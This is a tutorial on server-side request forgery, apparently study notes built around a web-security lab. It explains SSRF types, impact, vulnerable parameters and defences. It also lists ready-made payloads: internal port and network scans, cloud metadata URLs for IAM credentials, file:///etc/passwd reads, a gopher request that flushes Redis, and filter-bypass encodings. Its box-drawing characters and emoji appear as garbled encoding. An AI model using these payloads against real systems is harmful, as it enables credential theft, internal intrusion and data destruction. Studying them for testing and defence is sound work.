Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.

SSRF happens when an application lets you make the server send HTTP requests to an arbitrary location.

Think of it as:-

â€œYou control where the server sends a request.â€
"Imagine you're outside a secure building. You can't enter, but you convince an employee (the server) to go inside and fetch something for you. That employee has access you don't have."


Normal Flow:-
[User] --> [Web Server] --> [Response to User]

SSRF Attack:
[Attacker] --> [Vulnerable Web Server] --> [Internal System/Service]
                      |
                      +--> Server makes request on attacker's behalf


## Types of SSRF 

----> **Basic SSRF**
     â”œâ”€â”€ Against localhost (127.0.0.1)
     â””â”€â”€ Against internal infrastructure

-----> **Blind SSRF**
       â”œâ”€â”€ No direct response
       â””â”€â”€ Requires out-of-band detection

-----> **Semi-Blind SSRF**
       â””â”€â”€ Partial information disclosure


## Impact of SSRF Attacks

A successful SSRF can lead to:

**Information Disclosure:-**
    Access to internal APIs, dashboards
    Cloud metadata exposure (AWS, GCP, Azure)

**Privilege Escalation**
    Exploiting internal admin endpoints

**Remote Code Execution (when combined with other issues)**

**Pivoting inside internal networks**
    Access 127.0.0.1
    Access 169.254.169.254 (cloud metadata)
    Access internal microservices (e.g., http://internal-api:8080/)


## Detecting SSRF (High-Level Techniques)

When you see any of these in a form or parameter, SSRF might be possible:

| Parameter                    | Example                         |
| ---------------------------- | ------------------------------- |
| `url=`                       | Upload image from URL           |
| `fetch=`                     | Load feed using URL             |
| `callback=`                  | Webhooks                        |
| `redirect=`                  | Open redirect misconfigurations |
| `image=`, `avatar=`, `file=` | Image fetchers                  |

Look for:-
- Parameters that accept URLs
- Backend that performs requests on your behalf
- Error messages that suggest internal request failure
- Time delays (for blind SSRF)

**Common Vulnerable Parameters:**-
URL-based parameters:
â”œâ”€â”€ url=
â”œâ”€â”€ uri=
â”œâ”€â”€ path=
â”œâ”€â”€ src=
â”œâ”€â”€ href=
â”œâ”€â”€ redirect=
â”œâ”€â”€ redirectUrl=
â”œâ”€â”€ callback=
â”œâ”€â”€ next=
â”œâ”€â”€ dest=
â”œâ”€â”€ target=
â”œâ”€â”€ link=
â”œâ”€â”€ feed=
â”œâ”€â”€ host=
â”œâ”€â”€ site=
â”œâ”€â”€ imageUrl=
â”œâ”€â”€ iconUrl=
â””â”€â”€ webhookUrl=

**Common Vulnerable Features:-**


FEATURES PRONE TO SSRF                       
  ğŸ“„ PDF Generators                                         
    â””â”€â”€ Convert URL to PDF                                 
ğŸ–¼ï¸ Image Processors                                       
    â””â”€â”€ Fetch image from URL, resize, thumbnail            
ğŸ“¡ Webhook Functionality                                  
     â””â”€â”€ Send data to user-provided URL                     
 ğŸ“¥ File Upload via URL                                    
     â””â”€â”€ "Import from URL" feature                          
  ğŸ”— URL Preview/Unfurling                                  
     â””â”€â”€ Slack-like link previews                           
 ğŸ“Š Stock Check / Inventory APIs                           
    â””â”€â”€ Backend service communication                     
ğŸŒ Proxy Services                                         
    â””â”€â”€ Web proxies, translation services                  
 ğŸ“¨ Email Services                                         
    â””â”€â”€ Fetch remote email templates      


## Defence Against SSRF
- Strong SSRF Mitigation Checklist
- Allowlist domains (strict)
- Block private IP ranges
- Enforce URL parsing (avoid redirects)
- Disable internal network access from web apps
- Use metadata V2 tokens (AWS)
- Use SSRF protection libraries (cloud-native)


## Common Attack Techniques
 **1: Localhost Access**
 
```
 # Original Request
POST /product/stock HTTP/1.1
stockApi=http://stock.internal.com/check?product=1 (vulnerable point)

# Attack Payloads
stockApi=http://127.0.0.1/admin
stockApi=http://localhost/admin
stockApi=http://127.0.0.1:22          # SSH
stockApi=http://127.0.0.1:3306        # MySQL
stockApi=http://127.0.0.1:6379        # Redis
stockApi=http://127.0.0.1:27017       # MongoDB
```

**2: Internal Network Scanning
```
# Scan internal network for hosts
stockApi=http://192.168.0.1/
stockApi=http://192.168.0.2/
stockApi=http://192.168.0.3/
...
stockApi=http://192.168.0.254/

# Scan for common internal services
stockApi=http://192.168.0.1:8080/     # Web servers
stockApi=http://192.168.0.1:9200/     # Elasticsearch
stockApi=http://192.168.0.1:8500/     # Consul
```

**3: Cloud Metadata Access**
```
# AWS
stockApi=http://169.254.169.254/latest/meta-data/
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
stockApi=http://metadata.google.internal/computeMetadata/v1/

# Azure
stockApi=http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
stockApi=http://169.254.169.254/metadata/v1/
```

**4: Protocol Smuggling**
```
# File protocol
stockApi=file:///etc/passwd
stockApi=file:///c:/windows/win.ini

# Gopher protocol (for more complex attacks)
stockApi=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a

# Dict protocol
stockApi=dict://127.0.0.1:6379/info
```

### Filter Bypass Techniques


1ï¸âƒ£  IP ADDRESS OBFUSCATION                                     

127.0.0.1 can be written as:                               
    2130706433        (Decimal)                            
    017700000001      (Octal)                              
    0x7f000001        (Hexadecimal)                       
    127.1             (Shortened)                          
    127.0.1           (Shortened)                          
    0                 (Zero - sometimes works)             

2ï¸âƒ£  URL ENCODING                                                

http://127.0.0.1  â†’  http://%31%32%37%2e%30%2e%30%2e%31    
Double encode    â†’  http://%25%33%31%25%33%32%25%33%37...  

3ï¸âƒ£  DNS REBINDING                                               

Register domain that resolves to 127.0.0.1                 
    attacker.com â†’ 127.0.0.1                               
    spoofed.burpcollaborator.net                           
    nip.io: 127.0.0.1.nip.io                               

4ï¸âƒ£  PARSER INCONSISTENCIES                                      

http://trusted.com@127.0.0.1/                              
http://127.0.0.1#trusted.com                               
http://127.0.0.1?trusted.com                               
http://trusted.com.127.0.0.1.nip.io                        

5ï¸âƒ£  IPv6 BYPASSES                                               

http://[::1]/                                              
http://[0:0:0:0:0:0:0:1]/                                  
http://[::ffff:127.0.0.1]/                                 

6ï¸âƒ£  OPEN REDIRECT CHAINS                                        

Use allowed domain that has open redirect:                 
http://trusted.com/redirect?url=http://127.0.0.1/admin    



## Lab 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ATTACK STEPS                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚  Step 1: Find parameter that fetches URLs                       â”‚
â”‚          â””â”€â”€ stockApi parameter                                 â”‚
â”‚                                                                 â”‚
â”‚  Step 2: Test if it fetches arbitrary URLs                      â”‚
â”‚          â””â”€â”€ stockApi=http://127.0.0.1/                         â”‚
â”‚                                                                 â”‚
â”‚  Step 3: Access internal resources                              â”‚
â”‚          â””â”€â”€ stockApi=http://127.0.0.1/admin                    â”‚
â”‚                                                                 â”‚
â”‚  Step 4: Perform actions                                        â”‚
â”‚          â””â”€â”€ stockApi=http://127.0.0.1/admin/delete?user=carlos â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜